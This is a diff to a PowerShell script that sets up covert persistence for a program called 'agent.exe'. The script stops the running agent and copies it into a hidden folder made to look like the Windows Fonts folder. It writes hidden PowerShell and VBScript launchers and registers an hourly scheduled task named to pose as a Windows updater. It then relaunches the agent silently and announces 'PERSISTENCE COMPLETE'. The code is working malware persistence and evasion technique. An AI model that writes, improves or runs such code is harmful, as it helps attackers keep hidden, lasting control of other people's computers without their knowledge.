@@ -13,7 +13,14 @@ $sourcePath = $proc.Path
 Write-Host "[+] Found agent.exe (PID: $($proc.Id)) at: $sourcePath"
 
 # -------------------------------------------------------------------
-# 2. Copy agent to hidden fonts folder (without killing anything)
+# 2. Stop the agent so we can copy it
+# -------------------------------------------------------------------
+Write-Host "[+] Stopping agent (PID $($proc.Id)) to copy file..."
+Stop-Process -Id $proc.Id -Force
+Start-Sleep -Seconds 1
+
+# -------------------------------------------------------------------
+# 3. Copy agent to hidden fonts folder
 # -------------------------------------------------------------------
 $hideDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
 if (-not (Test-Path $hideDir)) {
@@ -23,27 +30,25 @@ if (-not (Test-Path $hideDir)) {
 }
 
 $agentFile = "$hideDir\agent.exe"
-# Force copy – works even if source is running (file not locked exclusively)
+# Remove old if exists
+if (Test-Path $agentFile) { Remove-Item $agentFile -Force }
 Copy-Item -LiteralPath $sourcePath -Destination $agentFile -Force
 attrib +h $agentFile
 Write-Host "[+] Agent copied to: $agentFile ($((Get-Item $agentFile).Length) bytes)"
 
 # -------------------------------------------------------------------
-# 3. Create run.ps1 – kills ALL agent processes, then starts fonts copy
+# 4. Create run.ps1 (kills any agent then starts the hidden one)
 # -------------------------------------------------------------------
 $runPs1 = "$hideDir\run.ps1"
 $ps1Content = @"
 `$ProgressPreference = 'SilentlyContinue'
 `$target = '$agentFile'
 
-# Kill every agent.exe process
+# Kill any remaining agent.exe processes
 Get-Process -Name "agent" -ErrorAction SilentlyContinue | ForEach-Object {
-    Write-Host "[+] Killing agent PID `$(`$_.Id)"
     Stop-Process -Id `$_.Id -Force
 }
 Start-Sleep -Seconds 1
-
-# Start the fresh copy
 Start-Process -WindowStyle Hidden -FilePath `$target
 "@
 Set-Content -Path $runPs1 -Value $ps1Content -Encoding ASCII -Force
@@ -51,7 +56,7 @@ attrib +h $runPs1
 Write-Host "[+] Created $runPs1"
 
 # -------------------------------------------------------------------
-# 4. Create run.vbs (silent launcher for run.ps1)
+# 5. Create run.vbs (silent launcher)
 # -------------------------------------------------------------------
 $runVbs = "$hideDir\run.vbs"
 $vbsContent = @"
@@ -63,7 +68,7 @@ attrib +h $runVbs
 Write-Host "[+] Created $runVbs"
 
 # -------------------------------------------------------------------
-# 5. Create/overwrite scheduled task (every 1 hour)
+# 6. Create scheduled task (every 1 hour)
 # -------------------------------------------------------------------
 $taskName = "WindowsUpdaterTaskHourly"
 schtasks /delete /tn $taskName /f 2>$null
@@ -71,16 +76,23 @@ schtasks /create /tn $taskName /tr "wscript.exe `"$runVbs`"" /sc hourly /mo 1 /r
 if ($LASTEXITCODE -eq 0) {
     Write-Host "[+] Scheduled task '$taskName' created (runs every hour)"
 } else {
-    Write-Output "ERROR: Task creation failed with exit code $LASTEXITCODE"
+    Write-Output "ERROR: Task creation failed"
     exit 1
 }
 
 # -------------------------------------------------------------------
-# 6. Run run.ps1 now to replace the old agent
+# 7. Start the agent from the fonts folder now
 # -------------------------------------------------------------------
-Write-Host "`n[*] Launching run.ps1 to replace running agent..."
-powershell.exe -NoProfile -ExecutionPolicy Bypass -File $runPs1
+Write-Host "`n[*] Starting agent from hidden folder..."
+Start-Process -WindowStyle Hidden -FilePath $agentFile
+Start-Sleep -Seconds 2
+$newProc = Get-Process -Name "agent" -ErrorAction SilentlyContinue
+if ($newProc) {
+    Write-Host "✅ Agent is now running from: $($newProc.Path)"
+} else {
+    Write-Host "⚠️ Agent did not start automatically. It will run at the next scheduled hour."
+}
 
 Write-Host "`n✅ PERSISTENCE COMPLETE"
-Write-Host "Agent now runs from: $agentFile (hidden)"
-Write-Host "Scheduled task '$taskName' will re-launch every hour."
+Write-Host "Agent location: $agentFile (hidden)"
+Write-Host "Scheduled task '$taskName' runs every hour"
